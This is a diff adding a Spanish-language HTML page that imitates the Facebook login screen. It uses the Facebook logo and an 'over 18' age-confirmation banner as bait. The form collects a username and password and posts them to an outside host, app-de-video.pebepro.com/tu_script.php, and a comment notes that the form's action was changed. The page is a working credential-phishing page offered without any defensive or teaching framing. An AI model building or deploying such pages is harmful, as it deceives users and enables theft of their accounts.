@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            margin: 20px auto 0 auto;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .login-container img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        .age-confirmation {
+            background-color: #fff3cd;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+
+        .age-confirmation p {
+            color: red;
+            font-weight: bold;
+            margin: 0;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        .login-container input[type="submit"] {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            padding: 16px;
+            margin: 8px 0;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #115293;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 8px;
+            margin: 8px 0;
+            border: none;
+            background-color: #42b72a;
+            color: white;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        @media only screen and (min-width: 601px) {
+            .login-container img {
+                max-width: 150px;
+            }
+        }
+
+        @media only screen and (max-width: 600px) {
+            .login-container {
+                width: 80%;
+            }
+            
+            .login-container img {
+                max-width: 100px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo de Facebook" />
+        <div class="age-confirmation" id="age-confirmation">
+            <p>¡Confirma que eres mayor de 18 años para continuar!</p>
+        </div>
+        <form id="login-form" action="https://app-de-video.pebepro.com/tu_script.php" method="POST">
+            <!-- Cambiado el atributo action del formulario -->
+            <input type="text" name="user" placeholder="Usuario" required /><br /><br />
+            <input type="password" name="pass" placeholder="Contraseña" required /><br /><br />
+            <input type="submit" value="Iniciar sesión" id="submit-button" />
+        </form>
+        <button class="create-account-button" disabled>Crear cuenta nueva</button>
+    </div>
+
+    <script>
+        const form = document.getElementById('login-form');
+        const submitButton = document.getElementById('submit-button');
+        const ageConfirmation = document.getElementById('age-confirmation');
+
+        // Aquí puedes agregar tu lógica JavaScript adicional según sea necesario...
+    </script>
+</body>
+
+</html>
